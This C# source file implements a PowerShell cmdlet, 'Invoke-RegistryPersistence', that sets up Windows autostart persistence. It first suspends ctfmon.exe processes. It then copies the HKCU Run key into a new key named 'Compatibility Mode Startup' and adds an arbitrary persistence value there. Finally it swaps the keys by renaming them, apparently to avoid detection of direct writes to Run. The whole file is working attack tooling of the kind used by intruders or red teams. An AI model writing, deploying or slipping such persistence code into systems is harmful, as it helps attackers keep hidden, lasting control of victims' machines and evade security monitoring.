using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Management.Automation;
using System.ComponentModel;
using System.Text;

namespace RegHelper
{
    [Cmdlet(VerbsLifecycle.Invoke, "RegistryPersistence")]
    public class InvokeRegistryPersistenceCommand : PSCmdlet
    {
        [Parameter(Mandatory = true, Position = 0)]
        public string PersistenceValueName { get; set; }

        [Parameter(Mandatory = true, Position = 1)]
        public string PersistenceValueData { get; set; }

        protected override void ProcessRecord()
        {
            try
            {
                WriteHost("Copy-and-Replace Registry Strategy Script", ConsoleColor.Cyan);
                WriteHost(new string('=', 45), ConsoleColor.Cyan);

                // Define paths and values
                string parentKeyPath = @"Software\Microsoft\Windows\CurrentVersion";
                string originalKeyName = "Run";
                string newKeyName = "Compatibility Mode Startup";
                string backupKeyName = "Compatibility Mode Backup";

                // Step 0: Suspend ctfmon.exe processes
                WriteHost("\nStep 0: Suspending ctfmon.exe process...", ConsoleColor.Green);
                var suspendedProcesses = ProcessSuspender.SuspendCtfmonProcesses(WriteHost, WriteWarning);

                try
                {
                    // Step 1: Open the parent registry key
                    WriteHost("\nStep 1: Opening parent registry key...", ConsoleColor.Green);
                    UIntPtr parentKeyHandle = UIntPtr.Zero;
                    int result = RegistryAPI.RegOpenKeyEx(
                        RegistryAPI.HKEY_CURRENT_USER,
                        parentKeyPath,
                        0,
                        RegistryAPI.KEY_ALL_ACCESS,
                        out parentKeyHandle
                    );

                    if (result != RegistryAPI.ERROR_SUCCESS)
                    {
                        throw new Exception($"Failed to open parent registry key. Error code: {result}");
                    }
                    WriteHost("Parent key opened successfully.", ConsoleColor.Green);

                    try
                    {
                        // Step 2: Create the new RunNew key
                        WriteHost($"\nStep 2: Creating '{newKeyName}' key...", ConsoleColor.Green);
                        UIntPtr newKeyHandle = UIntPtr.Zero;
                        uint disposition = 0;
                        result = RegistryAPI.RegCreateKeyEx(
                            parentKeyHandle,
                            newKeyName,
                            0,
                            null,
                            RegistryAPI.REG_OPTION_NON_VOLATILE,
                            RegistryAPI.KEY_ALL_ACCESS,
                            IntPtr.Zero,
                            out newKeyHandle,
                            out disposition
                        );

                        if (result != RegistryAPI.ERROR_SUCCESS)
                        {
                            throw new Exception($"Failed to create '{newKeyName}' key. Error code: {result}");
                        }
                        WriteHost($"'{newKeyName}' key created successfully.", ConsoleColor.Green);

                        // Step 3: Open the original Run key for reading
                        WriteHost($"\nStep 3: Opening original '{originalKeyName}' key for copying...", ConsoleColor.Green);
                        UIntPtr originalKeyHandle = UIntPtr.Zero;
                        result = RegistryAPI.RegOpenKeyEx(
                            parentKeyHandle,
                            originalKeyName,
                            0,
                            RegistryAPI.KEY_ALL_ACCESS,
                            out originalKeyHandle
                        );

                        if (result != RegistryAPI.ERROR_SUCCESS)
                        {
                            throw new Exception($"Failed to open original '{originalKeyName}' key. Error code: {result}");
                        }
                        WriteHost($"'{originalKeyName}' key opened for copying.", ConsoleColor.Green);

                        try
                        {
                            // Step 4: Copy all values from Run to RunNew
                            WriteHost($"\nStep 4: Copying values from '{originalKeyName}' to '{newKeyName}' using native APIs...", ConsoleColor.Green);
                            int valueCount = CopyRegistryValues(originalKeyHandle, newKeyHandle);
                            WriteHost($"Copied {valueCount} values using native APIs.", ConsoleColor.Green);

                            // Step 5: Add our new persistence value to RunNew
                            WriteHost($"\nStep 5: Adding new value to '{newKeyName}'...", ConsoleColor.Green);
                            WriteHost($"Name: {PersistenceValueName}", ConsoleColor.Cyan);
                            WriteHost($"Value: {PersistenceValueData}", ConsoleColor.Cyan);

                            byte[] valueDataBytes = Encoding.Unicode.GetBytes(PersistenceValueData + "\0");
                            result = RegistryAPI.RegSetValueEx(
                                newKeyHandle,
                                PersistenceValueName,
                                0,
                                RegistryAPI.REG_SZ,
                                valueDataBytes,
                                valueDataBytes.Length
                            );

                            if (result != RegistryAPI.ERROR_SUCCESS)
                            {
                                throw new Exception($"Failed to set new registry value '{PersistenceValueName}'. Error code: {result}");
                            }
                            WriteHost($"New value added successfully to '{newKeyName}'.", ConsoleColor.Green);

                        }
                        finally
                        {
                            // Close the original Run key handle
                            RegistryAPI.RegCloseKey(originalKeyHandle);
                        }

                        // Close the RunNew key handle before renaming operations
                        RegistryAPI.RegCloseKey(newKeyHandle);

                        // Step 6: Rename Run to RunBackup
                        WriteHost($"\nStep 6: Renaming '{originalKeyName}' to '{backupKeyName}'...", ConsoleColor.Green);
                        result = RegistryAPI.RegRenameKey(parentKeyHandle, originalKeyName, backupKeyName);

                        if (result != RegistryAPI.ERROR_SUCCESS)
                        {
                            throw new Exception($"Failed to rename '{originalKeyName}' to '{backupKeyName}'. Error code: {result}");
                        }
                        WriteHost($"'{originalKeyName}' renamed to '{backupKeyName}' successfully.", ConsoleColor.Green);

                        // Step 7: Rename RunNew to Run
                        WriteHost($"\nStep 7: Renaming '{newKeyName}' to '{originalKeyName}'...", ConsoleColor.Green);
                        result = RegistryAPI.RegRenameKey(parentKeyHandle, newKeyName, originalKeyName);

                        if (result != RegistryAPI.ERROR_SUCCESS)
                        {
                            throw new Exception($"Failed to rename '{newKeyName}' to '{originalKeyName}'. Error code: {result}");
                        }
                        WriteHost($"'{newKeyName}' renamed to '{originalKeyName}' successfully.", ConsoleColor.Green);

                    }
                    finally
                    {
                        // Close the parent key handle
                        RegistryAPI.RegCloseKey(parentKeyHandle);
                    }
                }
                finally
                {
                    // Resume ctfmon.exe processes
                    ProcessSuspender.ResumeCtfmonProcesses(suspendedProcesses, WriteHost, WriteWarning);
                }

                WriteHost("\n" + new string('=', 45), ConsoleColor.Cyan);
                WriteHost("Script completed successfully!", ConsoleColor.Green);
                WriteHost("The persistence entry has been added using copy-replace strategy.", ConsoleColor.Yellow);
                WriteHost("The application will now start automatically when Windows starts.", ConsoleColor.Yellow);
            }
            catch (Exception ex)
            {
                WriteError(new ErrorRecord(
                    ex,
                    "RegistryPersistenceError",
                    ErrorCategory.OperationStopped,
                    null));
                throw;
            }
        }

        private int CopyRegistryValues(UIntPtr originalKeyHandle, UIntPtr newKeyHandle)
        {
            int index = 0;
            int valueCount = 0;

            while (true)
            {
                StringBuilder valueName = new StringBuilder(256);
                int valueNameSize = 256;
                int valueType = 0;
                int dataSize = 0;

                // Get value name and size
                int result = RegistryAPI.RegEnumValue(
                    originalKeyHandle,
                    index,
                    valueName,
                    ref valueNameSize,
                    IntPtr.Zero,
                    out valueType,
                    IntPtr.Zero,
                    ref dataSize
                );

                if (result == RegistryAPI.ERROR_NO_MORE_ITEMS)
                {
                    break;
                }

                if (result != RegistryAPI.ERROR_SUCCESS)
                {
                    WriteWarning($"Failed to enumerate value at index {index}. Error: {result}");
                    index++;
                    continue;
                }

                // Allocate buffer for value data
                IntPtr dataBuffer = Marshal.AllocHGlobal(dataSize);

                try
                {
                    // Get the actual value data
                    result = RegistryAPI.RegQueryValueEx(
                        originalKeyHandle,
                        valueName.ToString(),
                        IntPtr.Zero,
                        out valueType,
                        dataBuffer,
                        ref dataSize
                    );

                    if (result == RegistryAPI.ERROR_SUCCESS)
                    {
                        // Set the value in the new key
                        int setResult = RegistryAPI.RegSetValueEx(
                            newKeyHandle,
                            valueName.ToString(),
                            0,
                            valueType,
                            dataBuffer,
                            dataSize
                        );

                        if (setResult == RegistryAPI.ERROR_SUCCESS)
                        {
                            WriteHost($"  Copied: {valueName.ToString()}", ConsoleColor.Gray);
                            valueCount++;
                        }
                        else
                        {
                            WriteWarning($"Failed to set value '{valueName.ToString()}'. Error: {setResult}");
                        }
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(dataBuffer);
                }

                index++;
            }

            return valueCount;
        }

        private void WriteHost(string message, ConsoleColor color)
        {
            Host.UI.WriteLine(color, Host.UI.RawUI.BackgroundColor, message);
        }

        private void WriteHost(string message)
        {
            Host.UI.WriteLine(message);
        }
    }

    public static class RegistryAPI
    {
        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern int RegOpenKeyEx(
            UIntPtr hKey,
            string subKey,
            uint options,
            uint samDesired,
            out UIntPtr phkResult);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern int RegCreateKeyEx(
            UIntPtr hKey,
            string lpSubKey,
            uint Reserved,
            string lpClass,
            uint dwOptions,
            uint samDesired,
            IntPtr lpSecurityAttributes,
            out UIntPtr phkResult,
            out uint lpdwDisposition);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern int RegRenameKey(
            UIntPtr hKey,
            string lpSubKeyName,
            string lpNewKeyName);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern int RegSetValueEx(
            UIntPtr hKey,
            string lpValueName,
            int Reserved,
            int dwType,
            byte[] lpData,
            int cbData);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern int RegSetValueEx(
            UIntPtr hKey,
            string lpValueName,
            int Reserved,
            int dwType,
            IntPtr lpData,
            int cbData);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern int RegEnumValue(
            UIntPtr hKey,
            int dwIndex,
            StringBuilder lpValueName,
            ref int lpcchValueName,
            IntPtr lpReserved,
            out int lpType,
            IntPtr lpData,
            ref int lpcbData);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto)]
        public static extern int RegQueryValueEx(
            UIntPtr hKey,
            string lpValueName,
            IntPtr lpReserved,
            out int lpType,
            IntPtr lpData,
            ref int lpcbData);

        [DllImport("advapi32.dll")]
        public static extern int RegCloseKey(UIntPtr hKey);

        public static readonly UIntPtr HKEY_CURRENT_USER = (UIntPtr)0x80000001;
        public const int KEY_ALL_ACCESS = 0xF003F;
        public const int REG_SZ = 1;
        public const int ERROR_SUCCESS = 0;
        public const int ERROR_NO_MORE_ITEMS = 259;
        public const int REG_OPTION_NON_VOLATILE = 0;
    }

    public static class ProcessSuspender
    {
        [DllImport("ntdll.dll", PreserveSig = false)]
        public static extern void NtSuspendProcess(IntPtr processHandle);

        [DllImport("ntdll.dll", PreserveSig = false)]
        public static extern void NtResumeProcess(IntPtr processHandle);

        public static Process[] SuspendCtfmonProcesses(
            Action<string, ConsoleColor> writeHost,
            Action<string> writeWarning)
        {
            var ctfmonProcesses = Process.GetProcessesByName("ctfmon");
            var suspendedProcesses = new Process[ctfmonProcesses.Length];

            if (ctfmonProcesses.Length > 0)
            {
                for (int i = 0; i < ctfmonProcesses.Length; i++)
                {
                    var process = ctfmonProcesses[i];
                    try
                    {
                        writeHost($"Suspending ctfmon.exe (PID: {process.Id})", ConsoleColor.Gray);
                        NtSuspendProcess(process.Handle);
                        suspendedProcesses[i] = process;
                    }
                    catch (Exception ex)
                    {
                        writeWarning($"Failed to suspend ctfmon.exe process (PID: {process.Id}): {ex.Message}");
                    }
                }
                writeHost("ctfmon.exe processes suspended.", ConsoleColor.Green);
            }
            else
            {
                writeHost("No ctfmon.exe processes found running.", ConsoleColor.Gray);
            }

            return suspendedProcesses;
        }

        public static void ResumeCtfmonProcesses(
            Process[] suspendedProcesses,
            Action<string, ConsoleColor> writeHost,
            Action<string> writeWarning)
        {
            writeHost("\nResuming ctfmon.exe processes...", ConsoleColor.Green);
            int resumedCount = 0;

            foreach (var process in suspendedProcesses)
            {
                if (process != null)
                {
                    try
                    {
                        if (!process.HasExited)
                        {
                            NtResumeProcess(process.Handle);
                            writeHost($"Resumed ctfmon.exe (PID: {process.Id})", ConsoleColor.Gray);
                            resumedCount++;
                        }
                    }
                    catch (Exception ex)
                    {
                        writeWarning($"Failed to resume ctfmon.exe process (PID: {process.Id}): {ex.Message}");
                    }
                }
            }

            if (resumedCount > 0)
            {
                writeHost("ctfmon.exe processes resumed.", ConsoleColor.Green);
            }
        }
    }
} 